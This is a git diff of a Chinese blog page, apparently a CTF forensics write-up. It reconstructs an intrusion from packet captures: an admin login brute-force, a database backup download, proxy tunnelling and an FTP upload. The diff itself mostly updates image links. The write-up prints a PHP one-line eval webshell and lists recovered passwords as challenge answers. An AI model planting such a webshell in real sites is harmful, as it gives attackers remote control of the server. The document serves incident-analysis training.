@@ -33,10 +33,10 @@ data-styled.g1[id="sc-global-hWSkCR1"]{content:"sc-global-hWSkCR1,"}/*!sc*/
 <h2>解题</h2>
 <h3>网站后台密码是？</h3>
 <p>首先打开<code class="language-text">data-sence2_00001_20180204175222.pcapng</code>。看到“网站后台密码”关键词，下意识先在过滤框中输入<code class="language-text">http</code>查看HTTP 传输数据，逛了一圈发现攻击方先是在扫描目录，最后尝试在<code class="language-text">/ad_admin.php?mod=login</code>进行爆破。</p>
-<p><img src="http://blog-tocz9ea.test.upcdn.net/img/2018051301.png"></p>
+<p><img src="https://site-blog-1252117910.cos.ap-shanghai.myqcloud.com/images/xqNMmQ.png" alt="xqNMmQ"></p>
 <p>接着打开<code class="language-text">data-sence2_00002_20180204175222.pcapng</code>，过滤仅查看 HTTP 数据，在末尾几处发现对<code class="language-text">/ad_admin.php?mod=login</code> 进行登陆处理后，依次 GET <code class="language-text">ad_admin.php?mod=homepage&amp;loginprompt=</code> 和<code class="language-text">ad_admin.php?mod=mainset</code>，说明登陆成功。此时在 Cookie 中留有 <code class="language-text">dpadmin_password</code> 字段，将其值放入 CMD5 中可得此题答案：<code class="language-text">aabbcc</code>。</p>
-<p><img src="http://blog-tocz9ea.test.upcdn.net/img/2018051302.png"></p>
-<p><img src="http://blog-tocz9ea.test.upcdn.net/img/2018051303.png"></p>
+<p><img src="https://site-blog-1252117910.cos.ap-shanghai.myqcloud.com/images/bQ2FKe.png" alt="bQ2FKe"></p>
+<p><img src="https://site-blog-1252117910.cos.ap-shanghai.myqcloud.com/images/TCF2vH.png" alt="TCF2vH"></p>
 <h3>攻击者的 IP 是？</h3>
 <p>分析上题中的两个数据包，在过滤后仅查看 HTTP 请求后，可以很明显的发现攻击方IP：<code class="language-text">202.1.1.2</code>，智商检测题。</p>
 <h3>网站后台登陆地址是？ （http:// + IP + 路径）</h3>
@@ -44,47 +44,47 @@ data-styled.g1[id="sc-global-hWSkCR1"]{content:"sc-global-hWSkCR1,"}/*!sc*/
 <h3>后台写入的 WebShell 内容是？</h3>
 <p>打开第三个数据包 <code class="language-text">data-sence2_00003_20180204175222.pcapng</code>，同样也是过滤仅查看 HTTP
 请求，同时将 Source 列按顺序排列后，从该列的<code class="language-text">202.1.1.2</code> 开始，第二行里包含着一段 base64，解码后可以知道WebShell的内容是：<code class="language-text">&lt;?php eval($_POST[&#39; cmd&#39;]);?&gt;</code>（记得去掉反斜杠）。</p>
-<p><img src="http://blog-tocz9ea.test.upcdn.net/img/2018051304.png"></p>
-<p><img src="http://blog-tocz9ea.test.upcdn.net/img/2018051305.png"></p>
+<p><img src="https://site-blog-1252117910.cos.ap-shanghai.myqcloud.com/images/ZiJ6Z1.png" alt="ZiJ6Z1"></p>
+<p><img src="https://site-blog-1252117910.cos.ap-shanghai.myqcloud.com/images/kuZrql.png" alt="kuZrql"></p>
 <h3>网站数据库密码是？</h3>
 <p>还是在第三个数据包中，攻击方在将 WebShell 文件<code class="language-text">shell2.php</code> 上传后，进行了一系列的 POST 操作，在返回的 HTML 文件中就可以找到攻击方请求获取数据库的所有信息，包括数据库密码：<code class="language-text">newnrtpassword</code>。</p>
-<p><img src="http://blog-tocz9ea.test.upcdn.net/img/2018051306.png"></p>
+<p><img src="https://site-blog-1252117910.cos.ap-shanghai.myqcloud.com/images/qos3fD.png" alt="qos3fD"></p>
 <h3>黑客上传 <code class="language-text">shell2.php</code> 后的第一个文件是？</h3>
 <p>这题问的是文件，就尝试在第三个和第四个包中直接导出 HTTP 对象后，没有发现有价值的线索。期间一直怀疑自己的思路有问题，但打开第五个数据包后，找到了答案：<code class="language-text">scan.php</code>。</p>
-<p><img src="http://blog-tocz9ea.test.upcdn.net/img/2018051307.png"></p>
+<p><img src="https://site-blog-1252117910.cos.ap-shanghai.myqcloud.com/images/Z1lvfe.png" alt="Z1lvfe"></p>
 <h3>黑客对内网扫描的 IP 范围是？（IP1 + IP2）</h3>
 <p>依着上一题的思路，在点选导出的 <code class="language-text">scan.php</code> 中，看到了这一题的答案：<code class="language-text">192.168.2.1 - 192.168.2.150</code>。</p>
-<p><img src="http://blog-tocz9ea.test.upcdn.net/img/2018051308.png"></p>
+<p><img src="https://site-blog-1252117910.cos.ap-shanghai.myqcloud.com/images/vpGc1u.png" alt="vpGc1u"></p>
 <h3>黑客下载的数据库备份文件名是？</h3>
 <p>这题同样问的是文件，也使用直接导出 HTTP 对象的方法查找，但第五个包已经没有符合条件的文件了，遂打开第六个数据包，对 <code class="language-text">Hostname</code> 进行分类后，找到了相像的文件 <code class="language-text">bak_2018-01-29-17-47-52.zip</code>，输入答题框中显示正确。</p>
-<p><img src="http://blog-tocz9ea.test.upcdn.net/img/2018051309.png"></p>
+<p><img src="https://site-blog-1252117910.cos.ap-shanghai.myqcloud.com/images/JRRVdk.png" alt="JRRVdk"></p>
 <h3>黑客上床的图马密码是？</h3>
 <p>接下来打开第七个数据包，又是过滤仅查看 HTTP 请求。在第一行中就给出了答案。</p>
 <p>其实是 <code class="language-text">shell2.php</code> POST 了一段数据，将其中 <code class="language-text">z1</code> 字段的值放入HEX编辑器中，显示了一句话代码，其中的 <code class="language-text">picto</code> 就是本题答案。</p>
-<p><img src="http://blog-tocz9ea.test.upcdn.net/img/2018051310.png"></p>
-<p><img src="http://blog-tocz9ea.test.upcdn.net/img/2018051311.png"></p>
+<p><img src="https://site-blog-1252117910.cos.ap-shanghai.myqcloud.com/images/uOcR21.png" alt="uOcR21"></p>
+<p><img src="https://site-blog-1252117910.cos.ap-shanghai.myqcloud.com/images/2GftRz.png" alt="2GftRz"></p>
 <h3>黑客修改了哪个文件来配合木马文件？（绝对路径）</h3>
 <p>继续分析第七个数据包，查看了第九题下方的几个请求和返回值，看到其中有一个貌似是 <code class="language-text">ls</code> 了一个目录，随后往下翻阅并和后续 <code class="language-text">ls</code> 后的结果进行对比，知道了黑客修改的文件是 <code class="language-text">obj_edit.php</code>。</p>
-<p><img src="http://blog-tocz9ea.test.upcdn.net/img/2018051312.png"></p>
-<p><img src="http://blog-tocz9ea.test.upcdn.net/img/2018051313.png"></p>
+<p><img src="https://site-blog-1252117910.cos.ap-shanghai.myqcloud.com/images/1NOnLe.png" alt="1NOnLe"></p>
+<p><img src="https://site-blog-1252117910.cos.ap-shanghai.myqcloud.com/images/avmpd1.png" alt="avmpd1"></p>
 <h3>FTP服务器的端口是？</h3>
 <p>在第七个数据包后面发现了新的 <code class="language-text">tunnel.php</code>，猜测可能是用来进行代理并和端口有关的木马文件，在导出 HTTP 对象的时候找到一个 12Kb 的文件，点击定位后同样将<code class="language-text">z1</code> 字段的值放入HEX编辑器中，再将转换后的值贴入 Sublime Text 中。分析代码，看见了如下语句，大概说的就是把连接成功后的端口放在 Header 的 <code class="language-text">X-PORT</code> 中。</p>
 <p>随后在第八个数据包中查找有关 <code class="language-text">tunnel.php</code> 的有关请求，最后发现了第 395467 行的请求，在 Header 中可见其 <code class="language-text">X-PORT</code> 为 1433，就为该题答案。</p>
-<p><img src="http://blog-tocz9ea.test.upcdn.net/img/2018051314.png"></p>
-<p><img src="http://blog-tocz9ea.test.upcdn.net/img/2018051315.png"></p>
-<p><img src="http://blog-tocz9ea.test.upcdn.net/img/2018051316.png"></p>
-<p><img src="http://blog-tocz9ea.test.upcdn.net/img/2018051317.png"></p>
-<p><img src="http://blog-tocz9ea.test.upcdn.net/img/2018051318.png"></p>
+<p><img src="https://site-blog-1252117910.cos.ap-shanghai.myqcloud.com/images/ONNrfW.png" alt="ONNrfW"></p>
+<p><img src="https://site-blog-1252117910.cos.ap-shanghai.myqcloud.com/images/nzCbYp.png" alt="nzCbYp"></p>
+<p><img src="https://site-blog-1252117910.cos.ap-shanghai.myqcloud.com/images/wr8FJ8.png" alt="wr8FJ8"></p>
+<p><img src="https://site-blog-1252117910.cos.ap-shanghai.myqcloud.com/images/iglM4c.png" alt="iglM4c"></p>
+<p><img src="https://site-blog-1252117910.cos.ap-shanghai.myqcloud.com/images/Rdan5O.png" alt="Rdan5O"></p>
 <h3>黑客使用 FTP 上传的文件名？</h3>
 <p>按上一题的 FTP 端口号，在设置中将 FTP 端口号改为 1433，随后再过滤仅查看 FTP 请求就能找到上传了一个名为 <code class="language-text">readmd.rtf</code> 文件，为正确答案。</p>
-<p><img src="http://blog-tocz9ea.test.upcdn.net/img/2018051319.png"></p>
-<p><img src="http://blog-tocz9ea.test.upcdn.net/img/2018051320.png"></p>
+<p><img src="https://site-blog-1252117910.cos.ap-shanghai.myqcloud.com/images/G5maR2.png" alt="G5maR2"></p>
+<p><img src="https://site-blog-1252117910.cos.ap-shanghai.myqcloud.com/images/cs84Ws.png" alt="cs84Ws"></p>
 <h3>黑客登陆 FTP 的密码是？</h3>
 <p>在上一题的上方，就能找到答案：<code class="language-text">qweasd123!@#</code>。</p>
-<p><img src="http://blog-tocz9ea.test.upcdn.net/img/2018051321.png"></p>
+<p><img src="https://site-blog-1252117910.cos.ap-shanghai.myqcloud.com/images/InwZll.png" alt="InwZll"></p>
 <h3>黑客使用 FTP 上传的文件，其内容是？</h3>
 <p>过滤仅查看 <code class="language-text">ftp-data</code> 请求，就能查看 <code class="language-text">readmd.rtf</code> 文件的内容了：<code class="language-text">CVE-2017-8570</code>。</p>
-<p><img src="http://blog-tocz9ea.test.upcdn.net/img/2018051322.png"></p>
+<p><img src="https://site-blog-1252117910.cos.ap-shanghai.myqcloud.com/images/BX2VSY.png" alt="BX2VSY"></p>
 <h2>总结</h2>
 <p>本次比赛的数据赛赛题是连贯的，攻击者的思路从此可以较为完整地分析，也让我学会了不少，这也是这次想写 WriteUp 的原因之一吧。在做题过程中，有些题目并不是一开始就很顺利，这次写出来也让我重新整理了下解题思路和解题方式。</p>
 <p>毕竟不是专业学习网安的，在分析方面如有欠缺，也请多多指教。</p></section><hr style="margin-bottom:1.75rem"/><footer><div style="display:flex;margin-bottom:2.625rem"><div class=" gatsby-image-wrapper" style="position:relative;overflow:hidden;display:inline-block;width:50px;height:50px;margin-right:0.875rem;margin-bottom:0;min-width:50px;border-radius:100%"><img aria-hidden="true" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAACXBIWXMAAAsTAAALEwEAmpwYAAAC7klEQVQ4y8VTS0hbURBVEytookhJFSl0WVOwm9IuXKk7cZGV3SnoSiil4kIoblJjsUihKqg7FbuyLYFgNKb+S1ApBBONn0hNih9CJGIWSpMm707P3Ob5wdBaN70wmcm7M2dmzszNyPhPR3PB1kIyb4SSmXk5rrm5+eYlXQDTZWdnP9dqtZ/xzYX/byD3VLd/rgy2E4pUKSgoICR4LTPpdJrrFpjFP3l5eaUMglaTo6OjiZGRkTiE6uvrzXzvdDqvB4jMskSNRnO/uLg4vrCwIPx+v5iZmUlMTU1RQ0PDO74nouu13NjYKB1zcnIMfX19P2KxGHk8HmV2djYBoZaWFhUw669gcJJ6aWlJOptMphf7+/txfCchxE/WFovlGd+5XK4/txwOh6Xu6uq61Mrg4OB7BrLZbNTa2morLCzUqXdIlh6svLxcarPZrILd6e7ufjo0NPTJ4XAkAoGAsrq6Sp2dnW/VmOnpaelbVFSUHrSmpka2aTAYjBMTEyFKneXlZQKw4IHs7e2R2+3eqK6ufsy+bW1t6XnU6/VnUxsYGHCksGKQJNO3ublJW1tbArbkc3Jy8utFzq+curo6mSk3N/eh1+tVGERRFBGPxxmEDg4OBAbFg5GZdnd3Y0aj8QHH1NbWXq2yvb2dH31GU1PTSw5I4BwdHYnDw0MB4pW5uTnq6OjYQPVP5ufnzdFolPk0ccz4+Lgm3brIdsGVlQEBkjg9PWUwwnokUSFZrdYA+5SVlT3CRtDw8PCrVOxlQAxBNW/Z7XYvA46NjSUxVYFFFpFIJLm9vU29vb3uysrKUnTzEcmYR7u64KDqHLC/v19WV1FRocfz+o5W6eTkhIehYPeUxcVFJRgMJn0+n+DKoOW0ode5iCvtIrMELCkpub2yssIDoVAoRMwb3vDvceP5ra2tSRvgxMDQUYTdTT3T88dQVVV1Zvf09FhA/AfsYRAgYcR/Y0GL/uPj4w3YPlTnAeD6zs7OF2aM4/Lz8yXgL+Co9wzy+TQCAAAAAElFTkSuQmCC" alt="tocz9ea" style="position:absolute;top:0;left:0;width:100%;height:100%;object-fit:cover;object-position:center;opacity:1;transition-delay:500ms;border-radius:50%"/><noscript><picture><source srcset="/static/8084d7caa6bac17a33557802bc0f87b9/8ba1e/profile-pic.png 1x,
